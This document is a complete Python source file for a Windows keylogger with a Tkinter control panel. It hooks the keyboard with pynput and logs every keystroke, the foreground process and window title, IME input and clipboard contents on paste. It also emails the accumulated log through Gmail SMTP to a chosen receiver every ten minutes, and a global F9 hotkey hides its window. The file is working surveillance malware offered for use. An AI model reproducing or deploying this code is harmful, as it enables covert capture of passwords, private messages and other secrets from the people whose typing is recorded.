import os
import sys
import time
import smtplib
import threading
import json
import tempfile
import subprocess
import shutil
import glob
import ctypes
from ctypes import wintypes, byref, create_unicode_buffer, c_ulong
from email.mime.text import MIMEText
import tkinter as tk
from tkinter import simpledialog, messagebox, ttk, filedialog


def install_and_import_packages():
    root = tk.Tk()
    root.title("Installing Dependencies")
    root.geometry("450x200")
    root.resizable(False, False)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    tk.Label(root, text="Installing required packages...", font=("Arial", 12, "bold")).pack(pady=10)
    
    progress = ttk.Progressbar(root, length=350, mode='determinate')
    progress.pack(pady=10)
    
    status_label = tk.Label(root, text="Initializing...", font=("Arial", 10))
    status_label.pack(pady=5)
    
    time_label = tk.Label(root, text="Estimated time: -- seconds", font=("Arial", 9), fg="gray")
    time_label.pack(pady=5)
    
    packages = {
        "pynput": "pynput",
        "win32clipboard": "pywin32"
    }
    
    total_packages = len(packages)
    current = 0
    estimated_times = {
        "pynput": 8,
        "win32clipboard": 5
    }
    start_time = time.time()
    
    for import_name, package_name in packages.items():
        current += 1
        progress['value'] = (current - 1) / total_packages * 50
        status_label.config(text=f"Checking {package_name}...")
        root.update()
        
        try:
            if import_name == "win32clipboard":
                __import__("win32clipboard")
            else:
                __import__(import_name)
            status_label.config(text=f"{package_name} already installed ✓")
            root.update()
            time.sleep(0.3)
        except ImportError:
            status_label.config(text=f"Installing {package_name}...")
            root.update()
            
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", package_name],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                status_label.config(text=f"{package_name} installed successfully ✓")
                root.update()
                time.sleep(0.5)
            except Exception:
                status_label.config(text=f"Failed to install {package_name}")
                root.update()
                time.sleep(1)
        
        progress['value'] = (current / total_packages) * 100
        root.update()
        
        elapsed = time.time() - start_time
        remaining_packages = total_packages - current
        remaining_time = 0
        for pkg_name in list(estimated_times.keys())[current:]:
            remaining_time += estimated_times.get(pkg_name, 5)
        
        if current < total_packages:
            estimated_remaining = max(1, remaining_time - elapsed * 0.3)
            time_label.config(text=f"Estimated time: {int(estimated_remaining)} seconds remaining")
        else:
            time_label.config(text="Finalizing...")
        
        root.update()
    
    status_label.config(text="All packages ready! ✓")
    time_label.config(text="Installation complete!")
    root.update()
    time.sleep(1)
    root.destroy()

install_and_import_packages()

from pynput import keyboard
import win32clipboard


class IMEInputHandler:
    def __init__(self):
        self.user32 = ctypes.windll.user32
        self.imm32 = ctypes.windll.imm32
        
    def get_ime_composition_string(self):
        try:
            hwnd = self.user32.GetForegroundWindow()
            hIMC = self.imm32.ImmGetContext(hwnd)
            if hIMC:
                buffer = ctypes.create_unicode_buffer(256)
                length = self.imm32.ImmGetCompositionStringW(
                    hIMC, 
                    0x0008,
                    buffer, 
                    256
                )
                self.imm32.ImmReleaseContext(hwnd, hIMC)
                if length > 0:
                    return buffer.value
            return None
        except Exception:
            return None


class EmailSender:
    def __init__(self, email, app_password):
        self.email = email
        self.app_password = app_password
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587

    def send(self, subject, body, receiver_email):
        msg = MIMEText(body, "plain", "utf-8")
        msg["Subject"] = subject
        msg["From"] = self.email
        msg["To"] = receiver_email
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.email, self.app_password)
                server.sendmail(self.email, receiver_email, msg.as_string())
            return True
        except Exception:
            return False


class KeyLogger:
    def __init__(self, sender_email=None, sender_password=None, receiver_email=None, use_email=False, log_path=None):
        self.log_path = log_path if log_path else os.path.join(os.path.dirname(os.path.abspath(__file__)), "log.txt")
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        self.psapi = ctypes.windll.psapi
        self.current_window = None
        self.current_pid = None
        self.current_process = None
        self.use_email = use_email
        self.receiver_email = receiver_email
        self.sender = EmailSender(sender_email, sender_password) if use_email else None
        self.interval = 600
        self.ctrl_pressed = False
        self.shift_pressed = False
        self.running = True
        
        self.ime_handler = IMEInputHandler()
        self.last_ime_text = ""
        self.last_key_time = 0
        
        log_dir = os.path.dirname(self.log_path)
        if log_dir and not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir)
            except:
                pass

    def report(self):
        if not self.use_email or not self.running:
            return
        if os.path.exists(self.log_path):
            try:
                with open(self.log_path, "r", encoding="utf-8") as f:
                    log_content = f.read()
                if log_content.strip():
                    success = self.sender.send(
                        f"Keylogger Report - {time.ctime()}",
                        log_content,
                        self.receiver_email,
                    )
                    if success:
                        with open(self.log_path, "w", encoding="utf-8") as f:
                            f.write(f"--- Log reset after email at {time.ctime()} ---\n")
            except Exception:
                pass
        if self.running:
            timer = threading.Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()

    def get_current_process(self):
        try:
            hwnd = self.user32.GetForegroundWindow()
            pid = c_ulong(0)
            self.user32.GetWindowThreadProcessId(hwnd, byref(pid))
            
            h_process = self.kernel32.OpenProcess(0x410, False, pid)
            if h_process:
                try:
                    executable = create_unicode_buffer(512)
                    self.psapi.GetModuleBaseNameW(h_process, None, byref(executable), 512)
                    
                    window_title = create_unicode_buffer(512)
                    self.user32.GetWindowTextW(hwnd, byref(window_title), 512)
                    
                    process_name = executable.value if executable.value else "Unknown"
                    window_title_str = window_title.value if window_title.value else "No Title"
                    
                    if (window_title_str != self.current_window or 
                        pid.value != self.current_pid or 
                        process_name != self.current_process):
                        
                        self.current_window = window_title_str
                        self.current_pid = pid.value
                        self.current_process = process_name
                        
                        header = f"\n\n[ PID: {pid.value} - {process_name} - {window_title_str} ]\n"
                        with open(self.log_path, "a", encoding="utf-8") as f:
                            f.write(header)
                finally:
                    self.kernel32.CloseHandle(h_process)
        except Exception:
            pass

    def get_key_name(self, key):
        try:
            if key == keyboard.Key.space:
                return " [SPACE] "
            elif key == keyboard.Key.enter:
                return "\n"
            elif key == keyboard.Key.backspace:
                return " [BACKSPACE] "
            elif key == keyboard.Key.tab:
                return " [TAB] "
            elif key == keyboard.Key.esc:
                return " [ESC] "
            elif key == keyboard.Key.up:
                return " [UP] "
            elif key == keyboard.Key.down:
                return " [DOWN] "
            elif key == keyboard.Key.left:
                return " [LEFT] "
            elif key == keyboard.Key.right:
                return " [RIGHT] "
            elif key == keyboard.Key.page_up:
                return " [PAGE_UP] "
            elif key == keyboard.Key.page_down:
                return " [PAGE_DOWN] "
            elif key == keyboard.Key.home:
                return " [HOME] "
            elif key == keyboard.Key.end:
                return " [END] "
            elif key == keyboard.Key.insert:
                return " [INSERT] "
            elif key == keyboard.Key.delete:
                return " [DELETE] "
            elif key == keyboard.Key.caps_lock:
                return " [CAPS_LOCK] "
            elif key == keyboard.Key.num_lock:
                return " [NUM_LOCK] "
            elif key == keyboard.Key.scroll_lock:
                return " [SCROLL_LOCK] "
            elif key == keyboard.Key.print_screen:
                return " [PRINT_SCREEN] "
            elif key == keyboard.Key.pause:
                return " [PAUSE] "
            elif key == keyboard.Key.menu:
                return " [MENU] "
            elif key == keyboard.Key.cmd:
                return " [WIN] "
            elif key == keyboard.Key.cmd_r:
                return " [WIN_R] "
            elif key == keyboard.Key.shift:
                return " [SHIFT] "
            elif key == keyboard.Key.shift_r:
                return " [R_SHIFT] "
            elif key == keyboard.Key.ctrl:
                return " [CTRL] "
            elif key == keyboard.Key.ctrl_r:
                return " [R_CTRL] "
            elif key == keyboard.Key.alt:
                return " [ALT] "
            elif key == keyboard.Key.alt_r:
                return " [R_ALT] "
            elif key == keyboard.Key.alt_gr:
                return " [ALT_GR] "
            elif hasattr(key, 'char') and key.char:
                return key.char
            else:
                return f" [{str(key).replace('Key.', '')}] "
        except:
            return ""

    def on_press(self, key):
        if not self.running:
            return
        
        self.get_current_process()
        current_time = time.time()
        
        try:
            if key in (keyboard.Key.ctrl, keyboard.Key.ctrl_r):
                self.ctrl_pressed = True
                return
            if key in (keyboard.Key.shift, keyboard.Key.shift_r):
                self.shift_pressed = True
                return

            if hasattr(key, "char") and key.char is not None:
                if self.ctrl_pressed and hasattr(key, "vk") and key.vk == 86:
                    try:
                        win32clipboard.OpenClipboard()
                        clip_data = win32clipboard.GetClipboardData()
                        win32clipboard.CloseClipboard()
                        content = f"\n[PASTE] - {clip_data}\n"
                        with open(self.log_path, "a", encoding="utf-8") as f:
                            f.write(content)
                    except Exception:
                        pass
                    return

            ime_text = self.ime_handler.get_ime_composition_string()
            if ime_text and ime_text != self.last_ime_text:
                self.last_ime_text = ime_text
                self.last_key_time = current_time
                with open(self.log_path, "a", encoding="utf-8") as f:
                    f.write(ime_text)
                return

            key_name = self.get_key_name(key)
            if key_name:
                with open(self.log_path, "a", encoding="utf-8") as f:
                    f.write(key_name)
                self.last_key_time = current_time

        except Exception:
            pass

    def on_release(self, key):
        if key in (keyboard.Key.ctrl, keyboard.Key.ctrl_r):
            self.ctrl_pressed = False
        if key in (keyboard.Key.shift, keyboard.Key.shift_r):
            self.shift_pressed = False
        if key == keyboard.Key.space:
            self.last_ime_text = ""

    def run(self):
        if self.use_email:
            self.report()
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            while self.running:
                time.sleep(0.5)
            listener.stop()

    def stop(self):
        self.running = False


class CustomInputDialog(simpledialog.Dialog):
    def __init__(self, parent, title):
        super().__init__(parent, title)

    def body(self, master):
        tk.Label(master, text="Sender Email:").grid(row=0, sticky="w", padx=10, pady=5)
        self.sender_entry = tk.Entry(master, width=40)
        self.sender_entry.grid(row=0, column=1, padx=10, pady=5)
        self.sender_entry.bind("<KeyRelease>", self.update_receiver_if_same)

        tk.Label(master, text="App Password (16-digits):").grid(row=1, sticky="w", padx=10, pady=5)
        self.password_entry = tk.Entry(master, show="*", width=40)
        self.password_entry.grid(row=1, column=1, padx=10, pady=5)

        tk.Label(master, text="Receiver Email:").grid(row=2, sticky="w", padx=10, pady=5)
        self.receiver_entry = tk.Entry(master, width=40)
        self.receiver_entry.grid(row=2, column=1, padx=10, pady=5)

        self.same_as_sender_var = tk.IntVar()
        self.checkbox = tk.Checkbutton(
            master,
            text="Same as sender email",
            variable=self.same_as_sender_var,
            command=self.toggle_receiver,
        )
        self.checkbox.grid(row=3, columnspan=2, pady=5)
        return self.sender_entry

    def toggle_receiver(self):
        if self.same_as_sender_var.get() == 1:
            sender_email = self.sender_entry.get().strip()
            self.receiver_entry.delete(0, tk.END)
            self.receiver_entry.insert(0, sender_email)
            self.receiver_entry.config(state="disabled")
        else:
            self.receiver_entry.config(state="normal")
            self.receiver_entry.delete(0, tk.END)

    def update_receiver_if_same(self, event=None):
        if self.same_as_sender_var.get() == 1:
            sender_email = self.sender_entry.get().strip()
            self.receiver_entry.config(state="normal")
            self.receiver_entry.delete(0, tk.END)
            self.receiver_entry.insert(0, sender_email)
            self.receiver_entry.config(state="disabled")

    def apply(self):
        sender = self.sender_entry.get().strip()
        pwd = self.password_entry.get().strip()
        if self.same_as_sender_var.get() == 1:
            receiver = sender
        else:
            receiver = self.receiver_entry.get().strip()
        self.result = (sender, pwd, receiver)


def get_user_config():
    root = tk.Tk()
    root.withdraw()
    use_email = messagebox.askyesno(
        "Configuration",
        "Would you like to send logs via Email?\n(Selecting 'No' will save logs locally only and disable auto-reset)",
    )
    
    if not use_email:
        root.destroy()
        return None, None, None, False

    dialog = CustomInputDialog(root, "Email Configuration")
    root.destroy()
    if dialog.result:
        sender, pwd, receiver = dialog.result
        if not sender or not pwd or not receiver:
            return None, None, None, False
        return sender, pwd, receiver, True
    return None, None, None, False


class ControlWindow:
    def __init__(self, master, config):
        self.master = master
        self.config = config
        self.logger = None
        self.logger_thread = None
        self.running = False
        self.visible = True
        
        self.config_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger_config.json")
        self.log_path = self.load_log_path()

        master.title("Keylogger Controller")
        master.geometry("480x320")
        master.resizable(False, False)
        master.protocol("WM_DELETE_WINDOW", self.on_close)

        self.status_label = tk.Label(master, text="Status: Stopped", font=("Arial", 12, "bold"))
        self.status_label.pack(pady=10)

        path_frame = tk.Frame(master)
        path_frame.pack(pady=5, padx=10, fill=tk.X)
        
        tk.Label(path_frame, text="Log Path:", font=("Arial", 9)).pack(side=tk.LEFT)
        
        self.path_var = tk.StringVar(value=self.log_path)
        self.path_entry = tk.Entry(path_frame, textvariable=self.path_var, width=35, font=("Arial", 8))
        self.path_entry.pack(side=tk.LEFT, padx=5)
        
        self.browse_btn = tk.Button(path_frame, text="Browse", command=self.browse_log_path, width=8, font=("Arial", 8))
        self.browse_btn.pack(side=tk.LEFT)

        tk.Frame(master, height=2, bg="gray").pack(fill=tk.X, pady=5)

        info_text = "Click 'Start Logger' to begin recording keystrokes.\n'Stop Logger' will terminate the background process."
        tk.Label(master, text=info_text, font=("Arial", 9), fg="gray").pack(pady=5)

        btn_frame = tk.Frame(master)
        btn_frame.pack(pady=10)

        self.start_btn = tk.Button(btn_frame, text="▶ Start Logger", command=self.start_logger, width=15, bg="#90EE90")
        self.start_btn.pack(side=tk.LEFT, padx=5)

        self.stop_btn = tk.Button(btn_frame, text="■ Stop Logger", command=self.stop_logger, width=15, state=tk.DISABLED, bg="#FF6B6B")
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        tk.Button(master, text="✕ Exit", command=self.on_close, width=10).pack(pady=5)

        hotkey_label = tk.Label(master, text="Press F9 to hide/show this window (global hotkey)", font=("Arial", 8), fg="gray")
        hotkey_label.pack(pady=5)

        self.setup_hotkey()

    def load_log_path(self):
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    path = config.get('log_path', '')
                    if path and os.path.exists(os.path.dirname(path)):
                        return path
        except:
            pass
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        return os.path.join(desktop, "keylog.txt")

    def save_log_path(self):
        try:
            config = {'log_path': self.log_path}
            with open(self.config_file, 'w', encoding='utf-8') as f:
                json.dump(config, f)
        except:
            pass

    def browse_log_path(self):
        initial_dir = os.path.dirname(self.log_path) if self.log_path else os.path.expanduser("~")
        file_path = filedialog.asksaveasfilename(
            title="Select Log File Location",
            initialdir=initial_dir,
            initialfile="keylog.txt",
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if file_path:
            self.log_path = file_path
            self.path_var.set(file_path)
            self.save_log_path()
            if self.logger:
                self.logger.log_path = file_path

    def setup_hotkey(self):
        def on_press(key):
            try:
                if key == keyboard.Key.f9:
                    self.master.after(0, self.toggle_visibility)
            except:
                pass
        
        self.hotkey_listener = keyboard.Listener(on_press=on_press)
        self.hotkey_listener.daemon = True
        self.hotkey_listener.start()

    def toggle_visibility(self):
        if self.visible:
            self.master.withdraw()
            self.visible = False
        else:
            self.master.deiconify()
            self.master.lift()
            self.master.focus_force()
            self.visible = True

    def start_logger(self):
        if self.running:
            return
        
        try:
            sender_email, sender_password, receiver_email, use_email = self.config
            
            self.logger = KeyLogger(
                sender_email=sender_email,
                sender_password=sender_password,
                receiver_email=receiver_email,
                use_email=use_email,
                log_path=self.log_path
            )
            
            self.logger_thread = threading.Thread(target=self.logger.run, daemon=True)
            self.logger_thread.start()
            
            time.sleep(1)
            
            if self.logger_thread.is_alive():
                self.running = True
                self.status_label.config(text="Status: Running ✓", fg="green")
                self.start_btn.config(state=tk.DISABLED)
                self.stop_btn.config(state=tk.NORMAL)
                messagebox.showinfo("Success", f"Keylogger started successfully!\nLog saved to:\n{self.log_path}")
            else:
                raise Exception("Thread died immediately")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start logger:\n{str(e)}")
            self.running = False
            self.logger = None
            self.logger_thread = None

    def stop_logger(self):
        if not self.running or self.logger is None:
            return
        
        try:
            self.logger.stop()
            self.running = False
            
            if self.logger_thread and self.logger_thread.is_alive():
                self.logger_thread.join(timeout=3)
        except Exception:
            pass
        
        self.logger = None
        self.logger_thread = None
        self.status_label.config(text="Status: Stopped", fg="black")
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        
        messagebox.showinfo("Stopped", "Keylogger stopped successfully!")

    def on_close(self):
        self.save_log_path()
        self.running = False
        if self.logger:
            try:
                self.logger.stop()
            except:
                pass
        if self.hotkey_listener:
            try:
                self.hotkey_listener.stop()
            except:
                pass
        self.master.destroy()


if __name__ == "__main__":
    sender_email, sender_password, receiver_email, use_email = get_user_config()
    
    config = (sender_email, sender_password, receiver_email, use_email)

    root = tk.Tk()
    app = ControlWindow(root, config)
    root.mainloop()